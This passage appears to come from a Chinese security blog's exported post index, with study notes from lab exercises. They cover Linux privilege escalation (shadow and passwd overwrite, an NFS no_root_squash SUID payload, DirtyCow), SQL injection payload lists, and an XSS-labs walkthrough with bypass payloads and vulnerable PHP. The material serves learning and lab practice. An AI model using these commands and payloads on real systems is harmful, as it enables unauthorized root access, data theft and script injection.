//生成1234的hash值\n$6$BWe0nZwWFr$Ek7Oxb/HmddxaOLZKAqi0PB9b/uJ3aDF/4SlmUQ07uT/HXT2yfyP7mtOZsJzgLR/jttTD/Fwv18sOzrKE2z6K1\n\n然后，编辑&#x2F;etc&#x2F;shadow文件，将生成的hash替换root的密码。之后，使用root登录即可。\n可写&#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;passwd 文件包含有关用户帐户的信息。它是全局可读的，但通常只能由 root 用户写入。从历史上看，&#x2F;etc&#x2F;passwd 文件包含用户密码哈希值，某些版本的 Linux 仍然允许将密码哈希值存储在那里。\n和前面etc&#x2F;shadow一个道理，生成hash进入文件替换，登录即可。\nNFS网络文件系统（NFS）是一个客户端&#x2F;服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。\n通过 NFS 创建的文件继承远程用户的 ID。如果用户是 root，并且启用了 root_sqaush 压缩，则 ID 将改为设置为“nobody”用户。如果没有启用，则具有root访问权限。\nRoot Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。\n也就是说，利用此漏洞，必须为no_root_squash\nuser@debian:~$ cat /etc/exports                       //查看nfs共享设置\n# /etc/exports: the access control list for filesystems which may be exported\n#\t\tto NFS clients.  See exports(5).\n#\n# Example for NFSv2 and NFSv3:\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\n#\n# Example for NFSv4:\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\n#\n\n/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)    ///tmp目录是可共享的，远程用户可以挂载它，并且/tmp目录共享还禁用了root_squash选项（启用no_root_squash选项-----即代表禁用了root_squash）\n#/tmp *(rw,sync,insecure,no_subtree_check)\n\n此时回到我们的本地kali\n┌──(n3ym4r㉿kali)-[~]\n└─$ su root                               //切换到root                                                          \n密码： \n┌──(root㉿kali)-[/home/n3ym4r]\n└─# mkdir /tmp/nfs                        //创建目录\n                                                                                                                \n                                                                                                                \n┌──(root㉿kali)-[/home/n3ym4r]\n└─# mount -o rw,vers=3 10.10.183.54:/tmp /tmp/nfs          //创建一个挂载点并挂载目标机的/tmp 共享目录\n\n\n                                                                                                                \n┌──(root㉿kali)-[/home/n3ym4r]\n└─# msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf  \n\n//msf生成一个payload并将其保存到刚才挂载的共享目录（这个payload的作用是调用/bin/bash）\n\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 48 bytes\nFinal size of elf file: 132 bytes\nSaved as: /tmp/nfs/shell.elf\n                                                                                                                \n┌──(root㉿kali)-[/home/n3ym4r]\n└─# chmod +xs /tmp/nfs/shell.elf                //使payload文件可执行并设置 SUID 权限\n\n切到目标机普通用户，执行payload文件\nuser@debian:~$ /tmp/shell.elf \nbash-4.1# id\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\n得到root\n内核漏洞运行 Linux Exploit Suggester 2 工具来识别当前系统上潜在的内核漏洞\nuser@debian:~$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl\n\n  #############################\n    Linux Exploit Suggester 2\n  #############################\n\n  Local Kernel: 2.6.32\n  Searching 72 exploits...\n\n  Possible Exploits\n  [1] american-sign-language\n      CVE-2010-4347\n      Source: http://www.securityfocus.com/bid/45408\n  [2] can_bcm\n      CVE-2010-2959\n      Source: http://www.exploit-db.com/exploits/14814\n  [3] dirty_cow\n      CVE-2016-5195\n      Source: http://www.exploit-db.com/exploits/40616\n  [4] exploit_x\n      CVE-2018-14665\n      Source: http://www.exploit-db.com/exploits/45697\n  [5] half_nelson1\n      Alt: econet       CVE-2010-3848\n      Source: http://www.exploit-db.com/exploits/17787\n  [6] half_nelson2\n      Alt: econet       CVE-2010-3850\n      Source: http://www.exploit-db.com/exploits/17787\n  [7] half_nelson3\n      Alt: econet       CVE-2010-4073\n      Source: http://www.exploit-db.com/exploits/17787\n  [8] msr\n      CVE-2013-0268\n      Source: http://www.exploit-db.com/exploits/27297\n  [9] pktcdvd\n      CVE-2010-3437\n      Source: http://www.exploit-db.com/exploits/15150\n  [10] ptrace_kmod2\n      Alt: ia32syscall,robert_you_suck       CVE-2010-3301\n      Source: http://www.exploit-db.com/exploits/15023\n  [11] rawmodePTY\n      CVE-2014-0196\n      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c\n  [12] rds\n      CVE-2010-3904\n      Source: http://www.exploit-db.com/exploits/15285\n  [13] reiserfs\n      CVE-2010-1146\n      Source: http://www.exploit-db.com/exploits/12130\n  [14] video4linux\n      CVE-2010-3081\n      Source: http://www.exploit-db.com/exploits/15024\n\n查看输出第三条著名漏洞——脏牛\n利用exp\n执行exp会将SUID文件&#x2F;usr/bin/passwd替换为 生成shell的文件（从外在看不出变化）\nuser@debian:~$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w     //编译exp\nuser@debian:~$ ./c0w                                                                  //执行\n                                \n   (___)                                   \n   (o o)_____/                             \n    @@ `     \\                            \n     \\ ____, //usr/bin/passwd                          \n     //    //                              \n    ^^    ^^                               \nDirtyCow root privilege escalation\nBacking up /usr/bin/passwd to /tmp/bak\nmmap 733f000\n\nmadvise 0\n\nptrace 0\n\nuser@debian:~$ /usr/bin/passwd                                             //执行替换后的usr/bin/passwd\nroot@debian:/home/user# \nroot@debian:/home/user# id                                               //得到root\nuid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\n这里存在的其他漏洞就不做演示了，使用exp利用即可。\n总结  提权的方法很多，要视实际情况而定，这里介绍到的是最基础的提权方式。\n  一般流程为：\n1.通过各种命令进行简单信息收集\n2.利用检测脚本批量快速收集可能利用的提权点\n检测出漏洞直接利用\n3.查看各种服务、配置文件、历史文件看有没有暴露的密码\n4.sudo&#x2F;suid&#x2F;cron提权\n5.查看各种服务、第三方应用的版本，看有无漏洞利用点，如MySQL的udf提权等\n7.内核exp\n\n参考链接：\nhttps://tryhackme.com/room/linuxprivesc#\nhttps://github.com/carlospolop/hacktricks/blob/master/linux-hardening/privilege-escalation/README.md\nhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid\n\n","tags":["linux","提权"]},{"title":"SQL注入学习笔记","url":"/2020/04/07/sql%E6%B3%A8%E5%85%A5/","content":"基础知识注入的分类基于从服务器接收到的响应▲基于错误的 SQL 注入▲联合查询的类型▲堆查询注射▲SQL 盲注•基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注基于如何处理输入的 SQL 查询（数据类型）▲基于字符串▲数字或整数为基础的基于注入点的位置上的▲通过用户输入的表单域的注射。▲通过 cookie 注射。▲通过服务器变量注射。 （基于头部信息的注射）系统函数\nversion()——MySQL 版本\nuser()——数据库用户名\ndatabase()——数据库名 \n@@datadir——数据库路径\n@@version_compile_os——操作系统版本\n\n字符串连接函数\nconcat(str1,str2,…)——没有分隔符地连接字符串\nconcat_ws(separator,str1,str2,…)——含有分隔符地连接字符串\ngroup_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据\n\n一般流程猜数据库select schema_name from information_schema.schemata猜某库的数据表select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’猜某表的所有列select column_name from information_schema.columns where table_name&#x3D;’xxxxx’获取某列的内容select *** from ****PS：一般都会用到group_concat来显示所有数据。\n盲注基于布尔 SQL 盲注———-构造逻辑判断▲left(database(),1)&gt;’s’ &#x2F;&#x2F;left()函数Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前b 位\n▲ascii(substr((select table_name information_schema.tables where tables_schema&#x3D;database()limit 0,1),1,1))&#x3D;101 –+ &#x2F;&#x2F;substr()函数，ascii()函数Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换为 ascii 值 \n▲ascii(substr((select database()),1,1))&#x3D;98▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 &#x2F;&#x2F;ORD()函数，MID()函数Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 Ord()函数同 ascii()，将字符转为 ascii 值\n▲regexp 正则注入 select user() regexp ‘^[a-z]’;Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。\n▲like 匹配注入select user() like ‘ro%’\n基于报错的 SQL 盲注——构造 payload 让信息通过错误提示回显出来▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; &#x2F;&#x2F;mysql 重复特性，此处重复了 version，所以报错。基于时间的 SQL 盲注———-延时注入▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if 判断语句，条件为假，执行 sleep导入导出相关操作导入到文件SELECT…..INTO OUTFILE ‘file_name’\nSelect  …… into outfile “c:\\phpnow\\htdocs\\test.php”\n增删改函数插入insert into users values(‘16’,’lcamry’,’lcamry’);\n删除删数据: delete from \n表名; delete from 表名 where id&#x3D;1; \n 删除结构： \n删数据库：drop database 数据库名; \n删除表：drop table 表名; \n删除表中的列:alter table 表名 drop column 列名;\nps:delete from users where id&#x3D;16\n修改&#x2F;更新修改所有：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ ; \n带条件的修改：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ where id&#x3D;6;\nps: update users set username&#x3D;’tt’ where id&#x3D;15\nHTTP 头部如何绕过 or 和 and 过滤。一般性提供以下几种思路：\n（1）大小写变形 Or,OR,oR \n（2）编码，hex，urlencode \n（3）添加注释&#x2F;or&#x2F; \n（4）利用符号 and&#x3D;&amp;&amp; or&#x3D;||\n对于注释和结尾字符的我们此处只能利用构造一个 ’ 来闭合后面到 ’ ；\n对于空格，有较多的方法：\n %09 TAB 键（水平）\n %0a 新建一行\n %0c 新的一页\n %0d return 功能 \n%0b TAB 键（垂直）\n %a0 空格\n","categories":["笔记"],"tags":["SQL注入"]},{"title":"XSS-labs通关笔记","url":"/2020/04/07/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/","content":"XSS-labs通关笔记level 1\n我们可以看到这里将name的参数值，插入到了 中，这里就是反射型xss，直接给name重新赋值。\n\n服务器并没有进行任何的过滤，我们可以看看服务器端\n服务器端源代码&lt;/script&gt;\n&lt;title&gt;欢迎来到level1&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;\n&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;name&quot;];                                                         &#x2F;&#x2F;这里将name赋值给了str\necho &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;       &#x2F;&#x2F;这里直接将str插入了标签之间,导致反射型xss形成\n**?&gt;**\n&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\nlevel 2\n可以发现，通过get传参提交，经过服务器的动态处理之后又会将参数keyword的值插入到&lt;h2&gt; &lt;/h2&gt;标签之中以及\n添加到&lt;input&gt;标签中的value属性的值内。\n我们尝试用上关的payload提交\n\n可以看到，在&lt;h2&gt; &lt;/h2&gt;标签之中的恶意代码被编码了，其中&lt;和&gt;都被编码成了html字符实体，猜测在服务器端用htmlspecialchars()函数对keyword参数的值进行了处理，接着往下看可以看到插入到value参数值中的恶意代码并没有被编码而是直接原样返回，但是问题是这里的js代码在标签属性值中，浏览器是无法执行的，既然上面的恶意代码被编码了，那么只能从属性值中的恶意代码处进行突破了。\n要想浏览器执行这里的弹窗代码，只需要将属性的引号和标签先闭合就可以了\n用”&gt;闭合前面的&lt;input，再用&#x2F;&#x2F;将后面的”注释掉。\npayload：n3ym4r&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;//\n服务器端源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];&#x2F;&#x2F;将get方式传递到服务器端的keyword参数的值赋给str变量\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n &#x2F;&#x2F;用htmlspecialchars()函数对变量str进行处理之后显示到网页上\n&lt;form action=level2.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;&#x2F;&#x2F;直接将变量值插入到了&lt;input&gt;标签的value属性值中\n&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;\n?&gt;\nlevel 3简单测试，发现与第二关相比，这里将属性值这里也进行了htmlspecialchars()函数处理。\n\n这里，无法使用标签，因为标签都是带有&lt;&gt;符号的，就会被转义。但该函数不会转义单引号，可以采用事件闭合标签。\npayload &#39; onclick=&#39;alert(1)&#x2F;&#x2F;当单击鼠标时运行脚本\n&#39; onmouseover=&#39;alert(1)&#x2F;&#x2F;当鼠标指针移至元素之上时运行脚本\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;\n&lt;form action=level3.php method=GET&gt;\n&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;   \n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&quot;;\n?&gt;\nhtmlspecialchars ()将特殊字符转换为html实体\nlevel 4\n可以看到&lt;&gt;符号被替换成了空\n但是事件不需要用到&lt;&gt;，所以直接用鼠标事件插入\npayload&quot; onmouseover=&quot;alert(/xss/)\n我们还是同样需要闭合他原来的语句。\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); \n$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);&#x2F;&#x2F;将&lt;&gt;替换为空\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level4.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nlevel 5源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level5.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n可以看到将&lt;script替换为了&lt;scr_ipt,同时也将on替换为了o_n,这使得我们无法通过&lt;script&gt;标签或触发事件来执行js代码，那么我们可以换个标签，使用a标签的js伪协议实现href属性支持javascript:伪协议构造poc 产生一个链接\npayload&quot;&gt; &lt;a href=javascript:alert(&#39;xss&#39;) &gt; xss&lt;/a&gt; //\nlevel 6源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);&#x2F;&#x2F;限制&lt;script恶意代码\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);&#x2F;&#x2F;限制带on的事件\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);&#x2F;&#x2F;限制图片标签，&lt;img src&#x3D;111 onerror&#x3D;alert(‘xss’)&gt;\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);&#x2F;&#x2F;data:对字符编码的一种设定\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);&#x2F;&#x2F;限制通过在href属性中插入js代码来点击执行\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level6.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n可以看到做了很多限制，但是都是判断的整个字符，我们可以大小写绕过\npayload&quot;&gt;&lt;sCrIpt&gt;alert(/xss/)&lt;/ScRipt&gt;\nlevel 7源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str =strtolower( $_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);&#x2F;&#x2F;将script替换为空，以下同理\n$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);\n$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);\n$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);\n$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level7.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n因为只会对整个字符串进行一次替换，所以我们可以使用双写绕过\npayload&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;\nlevel 8源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);\n$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);\necho &#39;&lt;center&gt;\n&lt;form action=level8.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;\n&lt;input type=submit name=submit value=添加友情链接 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n&lt;?php\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;; &#x2F;&#x2F;在这里进行拼接\n?&gt;\n&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;\n?&gt;\n可以看到将大部分能用到的字符都做了破坏，看到友情链接那里，我们可以使用编码的方式绕过\n\npayload&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;\nlevel 9源代码&lt;?php \n\nini_set(&quot;display_errors&quot;, 0);\n\n$str = strtolower($_GET[&quot;keyword&quot;]);\n\n$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);\n\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\n\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);\n\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);\n\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);\n\n$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);\n\necho &#39;&lt;center&gt;\n\n&lt;form action=level9.php method=GET&gt;\n\n&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;\n\n&lt;input type=submit name=submit value=添加友情链接 /&gt;\n\n&lt;/form&gt;\n\n&lt;/center&gt;&#39;;\n\n?&gt;\n\n&lt;?php\n\nif(false===strpos($str7,&#39;http://&#39;))  \n\n&#123;\n\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;\n\n   &#125;\n\nelse\n\n&#123;\n\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;\n\n&#125;\n\n?&gt;\n\n&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;\n\n&lt;?php \n\necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;\n\n?&gt;\n\nif(false&#x3D;&#x3D;&#x3D;strpos($str7,’http:&#x2F;&#x2F;‘))  判断是否包含http:&#x2F;&#x2F;然后返回,这里还是可以通过编码来绕过\npayload&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://\nlevel 10\n可以看到有三个input标签，我们得测试出哪个表单可以突破\n构造语句：?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;\n\nt_sort时，出现一个输入框，所以我们可以确定了\npayload?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\n源代码我们可以再看看源代码\n&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str11 = $_GET[&quot;t_sort&quot;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n可以看到，我们的猜测没错,值得注意的是，这里会将&lt;&gt;替换为空，不能通过闭合input，引入新的标签来触发，只能通过事件来触发。\nlevel 11源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_SERVER[&#39;HTTP_REFERER&#39;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n这一关卡和上面的一关非常的像多了一个input表单的信息，在服务器端还将请求头中的referer头的值赋给了str11这个变量，$_SERVER[‘HTTP_REFERER’]  #链接到当前页面的前一页面的 URL 地址，也就是说这里可以做点文章。在将变量值中的&lt;和&gt;删除之后就会插入到t_ref这个标签的value属性值中。而上一关的t_sort标签虽然也能接收并显示参数值，但是这个参数值是要用htmlspecialchars()函数处理的。\n这里，我们就可以抓包，将数据包中的referer改为我们的恶意代码\n\npayloadreferer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\nlevel 12\n查看网页源码，我们发现，有一个和ua头一样的参数值，我们可以大胆猜测，这关测试点就在ua头，抓包改包试试\n\n成功\npayloadUser-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n将keyword参数的值赋给了变量str\n将t_sot参数的值赋给了变量str00，\n将请求中User-Agent头的值赋给了变量str11,。\n将变量str11的值中存在的&lt;和&gt;删除之后直接插入到了t_ua标签的value\n属性值中。\n在这里变量str和str00的值都是需要被htmlspecialchars()函数处理过\nlevel 1313关猜测还是与数据头有关\n\n\n可以看到，是将cookies里的值放入了t_cook中，修改为恶意代码\npayloadCookie: user=1&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;\n源代码&lt;?php \nsetcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);\nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_COOKIE[&quot;user&quot;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nlevel 14修改iframe调用的文件来实现xss注入(但因为iframe调用的文件地址失效，无法进行测试\nlevel 15\n可以看到我们提交的src参数被插入到了&lt;span&gt;标签的class属性值中，但是前面还有ng-include这样的字符。\nng-include是angular 